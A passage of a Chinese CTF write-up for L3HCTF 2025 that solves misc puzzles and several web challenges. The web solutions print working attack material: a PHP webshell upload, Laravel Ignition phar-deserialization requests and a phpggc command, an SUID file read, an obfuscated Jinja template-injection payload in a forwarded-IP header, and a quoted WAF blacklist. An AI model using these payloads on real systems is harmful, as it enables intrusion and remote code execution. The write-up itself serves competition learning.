</span></span></code></pre></td></tr></table></div></div><p><img src=https://su-team.cn/img/2025-L3HCTF/1daa888b-d0cc-4a51-bef2-d6d262291ac5.png alt=img></p><h2 id=paperback>PaperBack</h2><p>给出了一条纸带上面全是点阵，看题目描述感觉像是拿纸带来保存数据，而且题目中提到了OllyDbg，通过关键词纸带和ollydbg可以搜到一个叫Paperback的东西：https://ollydbg.de/Paperbak/ ，下载这个软件扫描这条纸带可以扫描出一个很大的，但是内容空白的文件，放进Cyberchef转为hex可以看到：</p><p><img src=https://su-team.cn/img/2025-L3HCTF/321aeec8-1d5b-442a-acf6-bc4b3aa0e76c.png alt=img></p><p>只有20、09、0d、0a四种字符，而0d0a实际上就是<code>\r\n</code>，可以忽略，在这里将<code>0d 0a </code>换成换行可以得到：</p><p><img src=https://su-team.cn/img/2025-L3HCTF/935d47d1-f07f-4cf2-b9c3-d8c8025d9b4f.png alt=img></p><p>发现有很多单独出现的09，应该可以忽略，其余的每一行都只有20和09，而且除了第一行和那些单独出现的09之外全是十二个一组，猜测是二进制，且20对应0，09对应1，处理一下可以得到：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Plain data-lang=Plain><span class=line><span class=cl>01001100  
</span></span><span class=line><span class=cl>00110011  
</span></span><span class=line><span class=cl>01001000  
</span></span><span class=line><span class=cl>01000011  
</span></span><span class=line><span class=cl>01010100  
</span></span><span class=line><span class=cl>01000110  
</span></span><span class=line><span class=cl>01111011  
</span></span><span class=line><span class=cl>01110111  
</span></span><span class=line><span class=cl>01100101  
</span></span><span class=line><span class=cl>01101100  
</span></span><span class=line><span class=cl>01100011  
</span></span><span class=line><span class=cl>01101111  
</span></span><span class=line><span class=cl>01101101  
</span></span><span class=line><span class=cl>01100101  
</span></span><span class=line><span class=cl>01011111  
</span></span><span class=line><span class=cl>01110100  
</span></span><span class=line><span class=cl>01101111  
</span></span><span class=line><span class=cl>01011111  
</span></span><span class=line><span class=cl>01101100  
</span></span><span class=line><span class=cl>00110011  
</span></span><span class=line><span class=cl>01101000  
</span></span><span class=line><span class=cl>01100011  
</span></span><span class=line><span class=cl>01110100  
</span></span><span class=line><span class=cl>01100110  
</span></span><span class=line><span class=cl>00110010  
</span></span><span class=line><span class=cl>00110000  
</span></span><span class=line><span class=cl>00110010  
</span></span><span class=line><span class=cl>00110101  
</span></span><span class=line><span class=cl>01111101
</span></span></code></pre></td></tr></table></div></div><p>用Cyberchef转换一下就可以得到flag：</p><p><img src=https://su-team.cn/img/2025-L3HCTF/062d6937-e725-4a9c-9c29-a35978a11797.png alt=img></p><h2 id=why-not-read-it-out>Why not read it out?</h2><p>魔改trunic，手搓音标表</p><p>首先现在附件得到一个README文件，用010看看发现是jpg，而且末尾藏了一个翻转的base64编码，处理一下得到提示IGN Review，同时修改文件后缀打开图片得到以下内容</p><p><img src=https://su-team.cn/img/2025-L3HCTF/4366a723-310c-48c4-8277-4e6795d49a10.jpg alt=img></p><p>简单社工一下，确定这些文字来自于tunic这个游戏，这是一种由游戏作者自创的音标文字，将单词的音标划分为元音和辅音后，通过外圆内辅的构造方式拼凑出英文单词</p><p><img src=https://su-team.cn/img/2025-L3HCTF/305f380b-1cef-4381-a515-c87183afa9ca.png alt=img></p><p>然而正常去破译密文会发现不对劲，很多音标根本对不上，显然是出题人把文字给魔改了</p><p>此时再次分析提示，可以知道要去看ign的评论，在ign官网找到这个游戏后可以发现对应的官方测评只有下面这一个</p><p><a href=https://www.ign.com/articles/tunic-review-xbox-pc-steam>https://www.ign.com/articles/tunic-review-xbox-pc-steam</a></p><p>通过对比发现，评测的第一段内容与密文的前面一大段都是完全对应的，因此我们得到了魔改tunic文字的密文以及对应明文</p><p><img src=https://su-team.cn/img/2025-L3HCTF/c234ae48-7282-4de3-b6d4-62eac05daa20.png alt=img></p><p>随后我们要做的就是手搓映射表，然后解出下面的五条文字即可得到flag</p><p><img src=https://su-team.cn/img/2025-L3HCTF/18785a00-1b8d-4bee-b00e-6482c66d9702.png alt=img></p><p>最终破译出来的内容大致如下，简单处理一下即可得到正确的flag</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Python data-lang=Python><span class=line><span class=cl><span class=n>the</span> <span class=n>content</span> <span class=n>of</span> <span class=n>flag</span> <span class=ow>is</span><span class=p>:</span> <span class=n>come</span> <span class=n>on</span> <span class=n>little</span> <span class=n>brave</span> <span class=n>fox</span>
</span></span><span class=line><span class=cl><span class=n>replace</span> <span class=n>lesser</span> <span class=n>o</span> <span class=k>with</span> <span class=n>number</span> <span class=n>zero</span><span class=p>,</span> <span class=n>letter</span> <span class=n>l</span> <span class=k>with</span> <span class=n>number</span> <span class=n>one</span>
</span></span><span class=line><span class=cl><span class=n>replace</span> <span class=n>lesser</span> <span class=n>a</span> <span class=k>with</span> <span class=n>symbol</span> <span class=n>at</span>
</span></span><span class=line><span class=cl><span class=n>make</span> <span class=n>every</span> <span class=n>lesser</span> <span class=n>e</span> <span class=n>uppercase</span>
</span></span><span class=line><span class=cl><span class=n>use</span> <span class=n>underline</span> <span class=n>to</span> <span class=n>link</span> <span class=n>each</span> <span class=n>word</span>
</span></span></code></pre></td></tr></table></div></div><h1 id=web>Web</h1><h2 id=赛博侦探>赛博侦探</h2><p>抓包得到路由</p><p><img src=https://su-team.cn/img/2025-L3HCTF/2e309494-31a1-4e2c-ad39-baa4c1c43b5f.png alt=img></p><p>回答四个问题</p><p>邮箱根据下载的docx</p><p><img src=https://su-team.cn/img/2025-L3HCTF/41aecc71-b7f7-4182-9795-cacd56335a56.png alt=img></p><p>店铺根据羽毛球店的距离可以得到大致的地点</p><p><img src=https://su-team.cn/img/2025-L3HCTF/6e0f3c45-7240-4149-b3a8-30ea3e563a7b.png alt=img></p><p>取 114.175958,30.623494</p><p>老家一开始猜测就是武汉，实际需要通过机票码扫描</p><p><img src=https://su-team.cn/img/2025-L3HCTF/50758324-d972-4025-a866-3e94ef0718a1.png alt=img></p><p>知道了老家是福州以及英文名LELAND</p><p>跳转到路由/secret/my_lovely_photos，分析图片都是?name=，猜测文件读取</p><p><img src=https://su-team.cn/img/2025-L3HCTF/d2feac3a-b04a-4cbb-9a31-0567507cfbc7.png alt=img></p><p>下载文件得到flag</p><h2 id=gogogo出发喽>gogogo出发喽</h2><p><img src=https://su-team.cn/img/2025-L3HCTF/228a2243-d2e9-4304-9c4d-468c5e905c71.png alt=img></p><p>可以爆破出是<code>admin888</code>，本地也能getshell，但是不能进远程的后台，419错误。发现是开启了debug模式的，访问<code>/_ignition/health-check</code>得到的{&ldquo;can_execute_commands&rdquo;:true}这个回显，查看MakeViewVariableOptionalSolution.php</p><p><img src=https://su-team.cn/img/2025-L3HCTF/af08c65a-59dc-4dd2-9dd5-34334b129146.png alt=img></p><p>利用phpggc生成恶意payload</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Bash data-lang=Bash><span class=line><span class=cl>php -d <span class=s2>&#34;phar.readonly=0&#34;</span> ./phpggc Laravel/RCE5 <span class=s2>&#34;phpinfo();&#34;</span> --phar phar -o /tmp/phar.gif
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>cat /tmp/phar.gif <span class=p>|</span> base64 -w <span class=m>0</span>
</span></span></code></pre></td></tr></table></div></div><p>尝试直接利用CVE发现不能成功，审计代码找到一个上传文件的接口</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-HTTP data-lang=HTTP><span class=line><span class=cl><span class=nf>POST</span> <span class=nn>/api/image/base64</span> <span class=kr>HTTP</span><span class=o>/</span><span class=m>1.1</span>
</span></span><span class=line><span class=cl><span class=n>Host</span><span class=o>:</span> <span class=l>1.95.8.146:41164</span>
</span></span><span class=line><span class=cl><span class=n>Content-Length</span><span class=o>:</span> <span class=l>169</span>
</span></span><span class=line><span class=cl><span class=n>Accept</span><span class=o>:</span> <span class=l>application/json</span>
</span></span><span class=line><span class=cl><span class=n>Content-Type</span><span class=o>:</span> <span class=l>application/json</span>
</span></span><span class=line><span class=cl><span class=n>User-Agent</span><span class=o>:</span> <span class=l>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36</span>
</span></span><span class=line><span class=cl><span class=n>Origin</span><span class=o>:</span> <span class=l>http://1.95.8.146:41164</span>
</span></span><span class=line><span class=cl><span class=n>Referer</span><span class=o>:</span> <span class=l>http://1.95.8.146:41164/</span>
</span></span><span class=line><span class=cl><span class=n>Accept-Encoding</span><span class=o>:</span> <span class=l>gzip, deflate</span>
</span></span><span class=line><span class=cl><span class=n>Accept-Language</span><span class=o>:</span> <span class=l>zh-CN,zh;q=0.9</span>
</span></span><span class=line><span class=cl><span class=n>Connection</span><span class=o>:</span> <span class=l>close</span>
</span></span><span class=line><span class=cl><span class=err> </span>
</span></span><span class=line><span class=cl><span class=p>{</span><span class=nt>&#34;data&#34;</span><span class=p>:</span> <span class=s2>&#34;data:image/jpeg;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+&#34;</span><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p><img src=https://su-team.cn/img/2025-L3HCTF/20a51efc-3408-4c46-9a70-ee322c047832.png alt=img></p><p>成功上传，尝试写入phar文件</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span><span class=lnt>9
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-HTTP data-lang=HTTP><span class=line><span class=cl><span class=nf>POST</span> <span class=nn>/_ignition/execute-solution</span> <span class=kr>HTTP</span><span class=o>/</span><span class=m>1.1</span>
</span></span><span class=line><span class=cl><span class=n>Host</span><span class=o>:</span> <span class=l>1.95.8.146:41164</span>
</span></span><span class=line><span class=cl><span class=n>Content-Type</span><span class=o>:</span> <span class=l>application/json</span>
</span></span><span class=line><span class=cl><span class=n>User-Agent</span><span class=o>:</span> <span class=l>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>{</span><span class=nt>&#34;solution&#34;</span><span class=p>:</span><span class=s2>&#34;Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution&#34;</span><span class=p>,</span><span class=nt>&#34;parameters&#34;</span><span class=p>:{</span>
</span></span><span class=line><span class=cl><span class=nt>&#34;viewFile&#34;</span><span class=p>:</span><span class=s2>&#34;phar:///var/www/html/public/uploads/images/_uc40mzhOJ6cNEKoF.jpeg/test.txt&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=nt>&#34;variableName&#34;</span><span class=p>:</span><span class=s2>&#34;test&#34;</span>
</span></span><span class=line><span class=cl><span class=p>&#125;&#125;</span>
</span></span></code></pre></td></tr></table></div></div><p><img src=https://su-team.cn/img/2025-L3HCTF/f6b72b2a-24d7-410d-8366-6e77e42b067d.png alt=img></p><p>测试发现fast_destruct就可以绕过了，修复签名的脚本</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Python data-lang=Python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>hashlib</span> <span class=kn>import</span> <span class=n>sha1</span>
</span></span><span class=line><span class=cl><span class=k>with</span> <span class=nb>open</span><span class=p>(</span><span class=s1>&#39;phar.gif&#39;</span><span class=p>,</span> <span class=s1>&#39;rb&#39;</span><span class=p>)</span> <span class=k>as</span> <span class=n>file</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>f</span> <span class=o>=</span> <span class=n>file</span><span class=o>.</span><span class=n>read</span><span class=p>()</span> 
</span></span><span class=line><span class=cl>   
</span></span><span class=line><span class=cl><span class=n>s</span> <span class=o>=</span> <span class=n>f</span><span class=p>[:</span><span class=o>-</span><span class=mi>28</span><span class=p>]</span> <span class=c1># 获取要签名的数据</span>
</span></span><span class=line><span class=cl><span class=n>h</span> <span class=o>=</span> <span class=n>f</span><span class=p>[</span><span class=o>-</span><span class=mi>8</span><span class=p>:]</span> <span class=c1># 获取签名类型和GBMB标识</span>
</span></span><span class=line><span class=cl><span class=n>newf</span> <span class=o>=</span> <span class=n>s</span> <span class=o>+</span> <span class=n>sha1</span><span class=p>(</span><span class=n>s</span><span class=p>)</span><span class=o>.</span><span class=n>digest</span><span class=p>()</span> <span class=o>+</span> <span class=n>h</span> <span class=c1># 数据 + 签名 + (类型 + GBMB)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>with</span> <span class=nb>open</span><span class=p>(</span><span class=s1>&#39;phar1.gif&#39;</span><span class=p>,</span> <span class=s1>&#39;wb&#39;</span><span class=p>)</span> <span class=k>as</span> <span class=n>file</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>file</span><span class=o>.</span><span class=n>write</span><span class=p>(</span><span class=n>newf</span><span class=p>)</span> <span class=c1># 写入新文件</span>
</span></span></code></pre></td></tr></table></div></div><p>有了shell之后，发现权限不够，suid提权即可</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Python data-lang=Python><span class=line><span class=cl><span class=n>openssl</span> <span class=n>enc</span> <span class=o>-</span><span class=ow>in</span> <span class=s2>&#34;/flag_gogogo_chufalong&#34;</span>
</span></span></code></pre></td></tr></table></div></div><h2 id=best_><strong>best_profile</strong></h2><p>此路由二次渲染last_ip,如果last_ip可控会造成模板注入</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Python data-lang=Python><span class=line><span class=cl><span class=nd>@app.route</span><span class=p>(</span><span class=s2>&#34;/ip_detail/&lt;string:username&gt;&#34;</span><span class=p>,</span> <span class=n>methods</span><span class=o>=</span><span class=p>[</span><span class=s2>&#34;GET&#34;</span><span class=p>])</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>route_ip_detail</span><span class=p>(</span><span class=n>username</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>res</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;http://127.0.0.1/get_last_ip/</span><span class=si>{</span><span class=n>username</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>res</span><span class=o>.</span><span class=n>status_code</span> <span class=o>!=</span> <span class=mi>200</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=s2>&#34;Get last ip failed.&#34;</span>
</span></span><span class=line><span class=cl>    <span class=n>last_ip</span> <span class=o>=</span> <span class=n>res</span><span class=o>.</span><span class=n>text</span>
</span></span><span class=line><span class=cl>    <span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>ip</span> <span class=o>=</span> <span class=n>re</span><span class=o>.</span><span class=n>findall</span><span class=p>(</span><span class=sa>r</span><span class=s2>&#34;\d+\.\d+\.\d+\.\d+&#34;</span><span class=p>,</span> <span class=n>last_ip</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>country</span> <span class=o>=</span> <span class=n>geoip2_reader</span><span class=o>.</span><span class=n>country</span><span class=p>(</span><span class=n>ip</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>except</span> <span class=p>(</span><span class=ne>ValueError</span><span class=p>,</span> <span class=ne>TypeError</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>country</span> <span class=o>=</span> <span class=s2>&#34;Unknown&#34;</span>
</span></span><span class=line><span class=cl>    <span class=n>template</span> <span class=o>=</span> <span class=sa>f</span><span class=s2>&#34;&#34;&#34;
</span></span></span><span class=line><span class=cl><span class=s2>    &lt;h1&gt;IP Detail&lt;/h1&gt;
</span></span></span><span class=line><span class=cl><span class=s2>    &lt;div&gt;</span><span class=si>{</span><span class=n>last_ip</span><span class=si>}</span><span class=s2>&lt;/div&gt;
</span></span></span><span class=line><span class=cl><span class=s2>    &lt;p&gt;Country:</span><span class=si>{</span><span class=n>country</span><span class=si>}</span><span class=s2>&lt;/p&gt;
</span></span></span><span class=line><span class=cl><span class=s2>    &#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>render_template_string</span><span class=p>(</span><span class=n>template</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><p>应用使用了ProxyFix中间件</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Plain data-lang=Plain><span class=line><span class=cl>from werkzeug.middleware.proxy_fix import ProxyFix
</span></span><span class=line><span class=cl>app.wsgi_app = ProxyFix(app.wsgi_app)
</span></span></code></pre></td></tr></table></div></div><p>ProxyFix中间件的作用是从代理服务器传递的请求头中获取客户端的真实IP地址。当请求经过代理（如Nginx）时，原始客户端的IP会被保存在X-Forwarded-For头中。通过设置ProxyFix中间件，Flask的request.remote_addr将不再使用直接连接的客户端IP（通常是代理服务器的IP），而是使用X-Forwarded-For请求头中的IP地址。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-SQL data-lang=SQL><span class=line><span class=cl><span class=n>X</span><span class=o>-</span><span class=n>Forwarded</span><span class=o>-</span><span class=k>For</span><span class=p>:</span><span class=w> </span><span class=mi>127</span><span class=p>.</span><span class=mi>0</span><span class=p>.</span><span class=mi>0</span><span class=p>.</span><span class=mi>1</span><span class=w> </span><span class=err>{</span><span class=o>%</span><span class=k>set</span><span class=w> </span><span class=n>ca</span><span class=o>=</span><span class=n>e</span><span class=o>|</span><span class=n>slice</span><span class=p>(</span><span class=mi>16</span><span class=p>)</span><span class=o>|</span><span class=n>string</span><span class=o>|</span><span class=n>batch</span><span class=p>(</span><span class=mi>16</span><span class=p>)</span><span class=o>|</span><span class=k>first</span><span class=o>|</span><span class=k>last</span><span class=o>+</span><span class=n>e</span><span class=o>|</span><span class=n>slice</span><span class=p>(</span><span class=mi>7</span><span class=p>)</span><span class=o>|</span><span class=n>string</span><span class=o>|</span><span class=n>batch</span><span class=p>(</span><span class=mi>7</span><span class=p>)</span><span class=o>|</span><span class=k>first</span><span class=o>|</span><span class=k>last</span><span class=o>+</span><span class=n>e</span><span class=o>|</span><span class=n>slice</span><span class=p>(</span><span class=mi>8</span><span class=p>)</span><span class=o>|</span><span class=n>string</span><span class=o>|</span><span class=n>batch</span><span class=p>(</span><span class=mi>8</span><span class=p>)</span><span class=o>|</span><span class=k>first</span><span class=o>|</span><span class=k>last</span><span class=o>+</span><span class=n>e</span><span class=o>|</span><span class=n>slice</span><span class=p>(</span><span class=mi>11</span><span class=p>)</span><span class=o>|</span><span class=n>string</span><span class=o>|</span><span class=n>batch</span><span class=p>(</span><span class=mi>11</span><span class=p>)</span><span class=o>|</span><span class=k>first</span><span class=o>|</span><span class=k>last</span><span class=o>+</span><span class=n>cycler</span><span class=p>.</span><span class=n>__doc__</span><span class=p>[</span><span class=mi>697</span><span class=p>]</span><span class=o>+</span><span class=n>e</span><span class=o>|</span><span class=n>pprint</span><span class=o>|</span><span class=k>lower</span><span class=o>|</span><span class=n>batch</span><span class=p>(</span><span class=mi>5</span><span class=p>)</span><span class=o>|</span><span class=k>first</span><span class=o>|</span><span class=k>last</span><span class=o>+</span><span class=n>e</span><span class=o>|</span><span class=n>slice</span><span class=p>(</span><span class=mi>28</span><span class=p>)</span><span class=o>|</span><span class=n>string</span><span class=o>|</span><span class=n>batch</span><span class=p>(</span><span class=mi>28</span><span class=p>)</span><span class=o>|</span><span class=k>first</span><span class=o>|</span><span class=k>last</span><span class=o>+</span><span class=n>e</span><span class=o>|</span><span class=n>slice</span><span class=p>(</span><span class=mi>7</span><span class=p>)</span><span class=o>|</span><span class=n>string</span><span class=o>|</span><span class=n>batch</span><span class=p>(</span><span class=mi>7</span><span class=p>)</span><span class=o>|</span><span class=k>first</span><span class=o>|</span><span class=k>last</span><span class=o>+</span><span class=n>e</span><span class=o>|</span><span class=n>slice</span><span class=p>(</span><span class=mi>2</span><span class=p>)</span><span class=o>|</span><span class=n>string</span><span class=o>|</span><span class=n>batch</span><span class=p>(</span><span class=mi>2</span><span class=p>)</span><span class=o>|</span><span class=k>first</span><span class=o>|</span><span class=k>last</span><span class=o>%</span><span class=err>}&#123;&#123;</span><span class=p>(</span><span class=n>sbwaf</span><span class=p>.</span><span class=n>__eq__</span><span class=p>.</span><span class=n>__globals__</span><span class=p>.</span><span class=n>sys</span><span class=p>.</span><span class=n>modules</span><span class=p>.</span><span class=n>os</span><span class=p>.</span><span class=n>popen</span><span class=p>(</span><span class=n>ca</span><span class=p>)).</span><span class=k>read</span><span class=p>()</span><span class=err>&#125;&#125;</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><p>配置文件中有如下内容</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Plain data-lang=Plain><span class=line><span class=cl>location ~ .*\.(gif|jpg|jpeg|png|bmp|swf)$ {
</span></span><span class=line><span class=cl>    proxy_ignore_headers Cache-Control Expires Vary Set-Cookie;
</span></span><span class=line><span class=cl>    proxy_pass http://127.0.0.1:5000;
</span></span><span class=line><span class=cl>    proxy_cache static;
</span></span><span class=line><span class=cl>    proxy_cache_valid 200 302 30d;
</span></span><span class=line><span class=cl>}
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>location ~ .*\.(js|css)?$ {
</span></span><span class=line><span class=cl>    proxy_ignore_headers Cache-Control Expires Vary Set-Cookie;
</span></span><span class=line><span class=cl>    proxy_pass http://127.0.0.1:5000;
</span></span><span class=line><span class=cl>    proxy_cache static;
</span></span><span class=line><span class=cl>    proxy_cache_valid 200 302 12h;
</span></span><span class=line><span class=cl>}
</span></span></code></pre></td></tr></table></div></div><p>服务器设置了缓存所有以.js结尾的响应,同时注册功能没有限制用户名中的特殊字符,这使得我们可以构造特殊的用户名,例如:username.js。当我们注册完成后先向<code>/</code>发送带有<code>X-Forwarded-For:xxx</code>的请求，再向<code>/get_last_ip/username.js</code>发送请求,服务器返回的响应会被缓存,无论接下来的请求是否携带cookie,只要路径相同,返回的结果都会是相同的。<code>/ip_detail</code>路由内部向<code>/get_last_ip</code>发送的请求即使不携带cookie也会返回我们给予的last_ip。</p><h2 id=gateway_advance>gateway_advance</h2><p>对于此处的过滤</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Java data-lang=Java><span class=line><span class=cl><span class=n>access_by_lua_block</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>local</span><span class=w> </span><span class=n>blacklist</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=p>{</span><span class=s>&#34;%.&#34;</span><span class=p>,</span><span class=w> </span><span class=s>&#34;/&#34;</span><span class=p>,</span><span class=w> </span><span class=s>&#34;;&#34;</span><span class=p>,</span><span class=w> </span><span class=s>&#34;flag&#34;</span><span class=p>,</span><span class=w> </span><span class=s>&#34;proc&#34;</span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>local</span><span class=w> </span><span class=n>args</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>ngx</span><span class=p>.</span><span class=na>req</span><span class=p>.</span><span class=na>get_uri_args</span><span class=p>()</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=k>for</span><span class=w> </span><span class=n>k</span><span class=p>,</span><span class=w> </span><span class=n>v</span><span class=w> </span><span class=n>in</span><span class=w> </span><span class=nf>pairs</span><span class=p>(</span><span class=n>args</span><span class=p>)</span><span class=w> </span><span class=k>do</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>for</span><span class=w> </span><span class=n>_</span><span class=p>,</span><span class=w> </span><span class=n>b</span><span class=w> </span><span class=n>in</span><span class=w> </span><span class=nf>ipairs</span><span class=p>(</span><span class=n>blacklist</span><span class=p>)</span><span class=w> </span><span class=k>do</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=k>if</span><span class=w> </span><span class=n>string</span><span class=p>.</span><span class=na>find</span><span class=p>(</span><span class=n>v</span><span class=p>,</span><span class=w> </span><span class=n>b</span><span class=p>)</span><span class=w> </span><span class=n>then</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=n>ngx</span><span class=p>.</span><span class=na>exit</span><span class=p>(</span><span class=n>403</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                    </span><span class=n>end</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>end</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>end</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>}</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><p><a href=https://github.com/p0pr0ck5/lua-resty-waf/issues/280>https://github.com/p0pr0ck5/lua-resty-waf/issues/280</a></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
